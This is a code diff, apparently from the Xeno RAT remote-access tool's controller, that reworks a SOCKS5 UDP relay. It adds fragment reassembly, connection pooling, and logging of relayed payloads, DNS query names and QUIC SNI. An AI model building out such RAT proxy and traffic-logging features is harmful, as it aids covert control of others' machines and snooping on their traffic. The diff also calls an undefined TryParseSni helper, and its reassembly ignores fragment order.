@@ -177,7 +177,7 @@ namespace xeno_rat_server.Forms
                     lvi = new ListViewItem($"UDP Relay {localEp.Address}:{localEp.Port}");
                     listView1?.BeginInvoke((MethodInvoker)(() => listView1.Items.Add(lvi)));
 
-                    _ = Task.Run(() => HandleUdpRelay(udpRelay, clientSock));
+                    _ = Task.Run(() => HandleUdpRelay(udpRelay));
                     return;
                 }
                 else if (cmd == 1)
@@ -217,98 +217,225 @@ namespace xeno_rat_server.Forms
             }
         }
 
-        private async Task HandleUdpRelay(UdpClient udpRelay, Socket clientSock)
+        private async Task HandleUdpRelay(UdpClient udpRelay)
         {
-            IPEndPoint clientEp = null;
+            var clientBuffers = new Dictionary<IPEndPoint, List<(byte frag, byte[] payload)>>(); // reassembly per client
+            var udpClientPool = new Dictionary<string, UdpClient>(); // key: "ip:port"
+
+            void PostUi(string text)
+            {
+                try
+                {
+                    string show = text.Length > 1200 ? text.Substring(0, 1200) + "…(truncated)" : text;
+                    listView1?.BeginInvoke((MethodInvoker)(() =>
+                    {
+                        listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
+                        listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
+                        if (listView1.Items.Count > 0) listView1.EnsureVisible(listView1.Items.Count - 1);
+                    }));
+                }
+                catch { }
+            }
+
+            string Trunc(string s, int max) => s?.Length > max ? s.Substring(0, max) + "…(truncated)" : s;
+            bool LooksLikeText(byte[] data)
+            {
+                if (data == null || data.Length == 0) return false;
+                int printable = 0;
+                int toCheck = Math.Min(data.Length, 200);
+                for (int i = 0; i < toCheck; i++)
+                {
+                    byte b = data[i];
+                    if (b >= 0x20 && b <= 0x7E) printable++;
+                    else if (b == 0x09 || b == 0x0A || b == 0x0D) printable++;
+                }
+                return ((double)printable) / toCheck > 0.90;
+            }
+            string HexPreview(byte[] data, int maxBytes = 64)
+            {
+                int n = Math.Min(data.Length, maxBytes);
+                var hex = BitConverter.ToString(data, 0, n).Replace("-", " ");
+                if (data.Length > n) hex += " …";
+                return hex.ToLowerInvariant();
+            }
+
+            string TryParseDnsQueryName(byte[] payload)
+            {
+                try
+                {
+                    if (payload == null || payload.Length < 12) return null;
+                    int qdcount = (payload[4] << 8) | payload[5];
+                    if (qdcount == 0) return null;
+                    int pos = 12;
+                    var labels = new List<string>();
+                    while (pos < payload.Length)
+                    {
+                        int len = payload[pos++];
+                        if (len == 0) break;
+                        if (len + pos > payload.Length) return null;
+                        string label = Encoding.ASCII.GetString(payload, pos, len);
+                        labels.Add(label);
+                        pos += len;
+                    }
+                    return labels.Count > 0 ? string.Join(".", labels) : null;
+                }
+                catch { return null; }
+            }
 
             try
             {
-                Console.WriteLine("UDP relay started...");
+                PostUi("UDP relay enhanced started...");
 
                 while (true)
                 {
                     var result = await udpRelay.ReceiveAsync();
-                    byte[] data = result.Buffer;
+                    var data = result.Buffer;
+                    var clientEp = result.RemoteEndPoint;
 
-                    // First packet tells us the client's source endpoint
-                    if (clientEp == null) clientEp = result.RemoteEndPoint;
-
-                    if (data.Length < 10) continue; // minimum SOCKS5 UDP header size
+                    if (data == null || data.Length < 10) { PostUi($"UDP packet too small: {data?.Length ?? 0} bytes"); continue; }
 
                     int offset = 0;
-                    offset += 2; // RSV
-                    byte frag = data[offset++]; // FRAG
+                    ushort rsv = (ushort)((data[offset] << 8) | data[offset + 1]); offset += 2;
+                    byte frag = data[offset++];
                     byte atyp = data[offset++];
 
                     string destAddr = "";
                     int destPort = 0;
 
-                    // --- Parse destination address ---
-                    if (atyp == 0x01) // IPv4
+                    if (atyp == 0x01)
                     {
-                        destAddr = new IPAddress(new byte[] { data[offset], data[offset + 1], data[offset + 2], data[offset + 3] }).ToString();
+                        if (offset + 4 > data.Length) continue;
+                        destAddr = new System.Net.IPAddress(new byte[] { data[offset], data[offset + 1], data[offset + 2], data[offset + 3] }).ToString();
                         offset += 4;
                     }
-                    else if (atyp == 0x03) // Domain
+                    else if (atyp == 0x03)
                     {
                         int len = data[offset++];
+                        if (offset + len > data.Length) continue;
                         destAddr = Encoding.ASCII.GetString(data, offset, len);
                         offset += len;
                     }
-                    else if (atyp == 0x04) // IPv6
+                    else if (atyp == 0x04)
                     {
-                        byte[] ipv6 = new byte[16];
-                        Array.Copy(data, offset, ipv6, 0, 16);
-                        destAddr = new IPAddress(ipv6).ToString();
+                        if (offset + 16 > data.Length) continue;
+                        destAddr = new System.Net.IPAddress(data.Skip(offset).Take(16).ToArray()).ToString();
                         offset += 16;
+                    }
+                    else { PostUi($"Unsupported ATYP {atyp}"); continue; }
+
+                    if (offset + 2 > data.Length) continue;
+                    destPort = (data[offset] << 8) | data[offset + 1]; offset += 2;
+                    byte[] payload = data.Skip(offset).ToArray();
+
+                    // --- Reassembly for frag != 0
+                    if (frag != 0)
+                    {
+                        if (!clientBuffers.ContainsKey(clientEp)) clientBuffers[clientEp] = new List<(byte, byte[])>();
+                        clientBuffers[clientEp].Add((frag, payload));
+                        PostUi($"Fragmented UDP packet stored (FRAG={frag}) for {clientEp}->{destAddr}:{destPort}");
+                        continue; // wait for FRAG=0 packet
+                    }
+                    else if (clientBuffers.ContainsKey(clientEp) && clientBuffers[clientEp].Count > 0)
+                    {
+                        // assemble fragments
+                        var fragments = clientBuffers[clientEp];
+                        var totalLen = fragments.Sum(f => f.Item2.Length) + payload.Length;
+                        byte[] fullPayload = new byte[totalLen];
+                        int p = 0;
+                        foreach (var f in fragments) { Array.Copy(f.Item2, 0, fullPayload, p, f.Item2.Length); p += f.Item2.Length; }
+                        Array.Copy(payload, 0, fullPayload, p, payload.Length);
+                        payload = fullPayload;
+                        clientBuffers[clientEp].Clear();
+                        clientBuffers.Remove(clientEp);
+                        PostUi($"Reassembled UDP payload length={payload.Length} for {clientEp}->{destAddr}:{destPort}");
+                    }
+
+                    // --- QUIC Initial TLS ClientHello SNI inspection (best-effort)
+                    if (payload.Length > 5 && payload[0] >= 0xC0) // long header
+                    {
+                        try
+                        {
+                            // parse TLS inside QUIC Initial (simplified)
+                            var sni = TryParseSni(payload);
+                            if (!string.IsNullOrEmpty(sni))
+                                PostUi($"QUIC Initial packet: SNI={sni} from {clientEp}");
+                        }
+                        catch { }
+                    }
+
+                    // --- Logging payload
+                    PostUi($"UDP -> {destAddr}:{destPort}, {payload.Length} bytes");
+                    if (payload.Length == 0) { PostUi("Payload empty"); }
+                    else if (LooksLikeText(payload))
+                    {
+                        string txt = null;
+                        try { txt = Encoding.UTF8.GetString(payload); } catch { try { txt = Encoding.ASCII.GetString(payload); } catch { } }
+                        PostUi($"Payload (text preview): {Trunc(txt, 400)}");
                     }
                     else
                     {
-                        Console.WriteLine("Unsupported ATYP: " + atyp);
-                        continue;
+                        PostUi($"Payload preview (hex): {HexPreview(payload, 80)}");
                     }
 
-                    destPort = (data[offset] << 8) | data[offset + 1];
-                    offset += 2;
+                    // --- DNS inspection
+                    if (destPort == 53)
+                    {
+                        string qname = TryParseDnsQueryName(payload);
+                        if (!string.IsNullOrEmpty(qname))
+                            PostUi($"DNS query for: {qname}");
+                    }
 
-                    byte[] payload = new byte[data.Length - offset];
-                    Array.Copy(data, offset, payload, 0, payload.Length);
+                    // --- UDP forward (reuse UdpClient)
+                    string poolKey = $"{destAddr}:{destPort}";
+                    if (!udpClientPool.TryGetValue(poolKey, out var remoteUdp))
+                    {
+                        remoteUdp = new UdpClient();
+                        udpClientPool[poolKey] = remoteUdp;
+                    }
 
-                    // --- Send to destination ---
-                    using (UdpClient remoteUdp = new UdpClient())
+                    try
                     {
                         await remoteUdp.SendAsync(payload, payload.Length, destAddr, destPort);
 
-                        // Wait for response
-                        var resp = await remoteUdp.ReceiveAsync();
+                        // optionally await response (timeout)
+                        var recvTask = remoteUdp.ReceiveAsync();
+                        var completed = await Task.WhenAny(recvTask, Task.Delay(5000));
+                        if (completed == recvTask)
+                        {
+                            var resp = recvTask.Result;
+                            byte[] remotePayload = resp.Buffer;
 
-                        // --- Build SOCKS5 UDP header + payload ---
-                        byte[] addrBytes = resp.RemoteEndPoint.Address.GetAddressBytes();
-                        byte[] portBytes = new byte[] { (byte)(resp.RemoteEndPoint.Port >> 8), (byte)(resp.RemoteEndPoint.Port & 0xFF) };
-                        byte respAtyp = addrBytes.Length == 4 ? (byte)0x01 : (byte)0x04;
+                            // Build SOCKS5 UDP response header back to client
+                            byte respAtyp = (byte)(resp.RemoteEndPoint.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork ? 0x01 : 0x04);
+                            byte[] addrBytes = resp.RemoteEndPoint.Address.GetAddressBytes();
+                            byte[] portBytes = new byte[] { (byte)(resp.RemoteEndPoint.Port >> 8), (byte)(resp.RemoteEndPoint.Port & 0xFF) };
+                            byte[] respPacket = new byte[3 + 1 + addrBytes.Length + 2 + remotePayload.Length];
+                            int ro = 0; respPacket[ro++] = 0x00; respPacket[ro++] = 0x00; respPacket[ro++] = 0x00; respPacket[ro++] = respAtyp;
+                            Array.Copy(addrBytes, 0, respPacket, ro, addrBytes.Length); ro += addrBytes.Length;
+                            respPacket[ro++] = portBytes[0]; respPacket[ro++] = portBytes[1];
+                            Array.Copy(remotePayload, 0, respPacket, ro, remotePayload.Length);
 
-                        byte[] respPacket = new byte[3 + 1 + addrBytes.Length + 2 + resp.Buffer.Length];
-                        int roffset = 0;
-                        respPacket[roffset++] = 0x00; // RSV
-                        respPacket[roffset++] = 0x00; // RSV
-                        respPacket[roffset++] = 0x00; // FRAG
-                        respPacket[roffset++] = respAtyp;
-                        Array.Copy(addrBytes, 0, respPacket, roffset, addrBytes.Length);
-                        roffset += addrBytes.Length;
-                        respPacket[roffset++] = portBytes[0];
-                        respPacket[roffset++] = portBytes[1];
-                        Array.Copy(resp.Buffer, 0, respPacket, roffset, resp.Buffer.Length);
+                            await udpRelay.SendAsync(respPacket, respPacket.Length, clientEp);
 
-                        // --- Send back to client ---
-                        await udpRelay.SendAsync(respPacket, respPacket.Length, clientEp);
+                            int rlen = remotePayload.Length;
+                            if (rlen == 0) PostUi($"Response from {resp.RemoteEndPoint}: empty");
+                            else if (LooksLikeText(remotePayload))
+                            {
+                                string textResp = null;
+                                try { textResp = Encoding.UTF8.GetString(remotePayload); } catch { try { textResp = Encoding.ASCII.GetString(remotePayload); } catch { } }
+                                PostUi($"Response from {resp.RemoteEndPoint} (text preview): {Trunc(textResp, 400)}");
+                            }
+                            else
+                            {
+                                PostUi($"Response from {resp.RemoteEndPoint} (hex preview): {HexPreview(remotePayload, 80)}");
+                            }
+                        }
+                        else PostUi($"No response from {destAddr}:{destPort} (timeout)");
                     }
+                    catch (Exception ex) { PostUi($"UDP forward error: {ex.Message}"); }
                 }
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine("UDP relay error: " + ex.Message);
-                udpRelay.Close();
-            }
+            catch (Exception ex) { PostUi("UDP relay error: " + ex.Message); }
         }
 
         private byte[] BuildUdpResponse(byte[] payload, IPEndPoint remote)
